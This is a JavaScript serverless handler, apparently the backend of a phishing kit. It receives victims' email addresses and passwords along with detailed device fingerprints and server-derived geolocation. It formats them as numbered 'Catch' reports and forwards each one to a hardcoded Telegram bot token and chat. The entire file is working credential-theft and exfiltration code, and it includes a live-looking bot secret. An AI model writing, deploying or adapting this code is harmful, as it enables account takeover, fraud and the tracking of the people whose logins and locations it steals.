module.exports = async (req, res) => {
    const BOT_TOKEN = '8674321912:AAH9ncPM6rtU8cilPYiS_uR4ZZNZOxnLfRs';
    const CHAT_ID = '7607355489';

    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const data = req.body;
    const intel = data.intel || {};

    // Server-side geo from Vercel headers
    const serverGeo = {
        ip: req.headers['x-forwarded-for']?.split(',')[0] || 'unknown',
        country: req.headers['x-vercel-ip-country'] || 'unknown',
        city: req.headers['x-vercel-ip-city'] || 'unknown',
        region: req.headers['x-vercel-ip-country-region'] || 'unknown',
        lat: req.headers['x-vercel-ip-latitude'] || 'unknown',
        lon: req.headers['x-vercel-ip-longitude'] || 'unknown',
        timezone: req.headers['x-vercel-ip-timezone'] || 'unknown'
    };

    // Parse user agent for clean browser/OS display
    const ua = data.userAgent || '';
    const browser = ua.match(/(Chrome|Firefox|Safari|Edge)\/[\d.]+/)?.[0] || 'Unknown';
    const os = ua.match(/\(([^)]+)\)/)?.[1] || 'Unknown';

    const text = `🎣 *Catch #${data.attemptNumber}*\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n\n` +
                 `*📧 Credentials*\n` +
                 `Email: \\${data.email}\n` +
                 `Pass: \\${data.password}\n\n` +
                 `*🌍 Location (Server)*\n` +
                 `IP: \\${serverGeo.ip}\n` +
                 `Country: \\${serverGeo.country}\n` +
                 `City: \\${serverGeo.city}\n` +
                 `Region: \\${serverGeo.region}\n` +
                 `Coords: \\${serverGeo.lat}, \\${serverGeo.lon}\n\n` +
                 `*💻 Device*\n` +
                 `Browser: \\${browser}\n` +
                 `OS: \\${os}\n` +
                 `Screen: \\${intel.screen}\n` +
                 `Cores: \\${intel.cores}\n` +
                 `RAM: \\${intel.memory}GB\n` +
                 `Battery: \\${intel.batteryLevel} \\${intel.batteryCharging ? '(charging)' : ''}\n` +
                 `Connection: \\${intel.connectionType} / \\${intel.downlink}Mbps\n` +
                 `Touch: \\${intel.touchPoints} points\n\n` +
                 `*🔍 Fingerprint*\n` +
                 `Canvas: \\${intel.canvasHash}\n` +
                 `Timezone: \\${intel.timezone}\n` +
                 `Languages: \\${intel.languages?.join(', ')}\n` +
                 `Referrer: \\${intel.referrer}\n` +
                 `External IP: \\${intel.externalIP}\n` +
                 `Geo Permission: \\${intel.geoPermission}\n` +
                 `Media: \\${intel.mediaDevices}\n\n` +
                 `*⏰ Time*\n` +
                 `\\${new Date(data.timestamp).toLocaleString()}`;

    try {
        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'MarkdownV2'
            })
        });

        const tgData = await tgRes.json();
        if (!tgData.ok) throw new Error(tgData.description);

        return res.status(200).json({ ok: true });
    } catch (err) {
        console.error('Telegram error:', err.message);
        return res.status(200).json({ ok: false, error: err.message });
    }
};
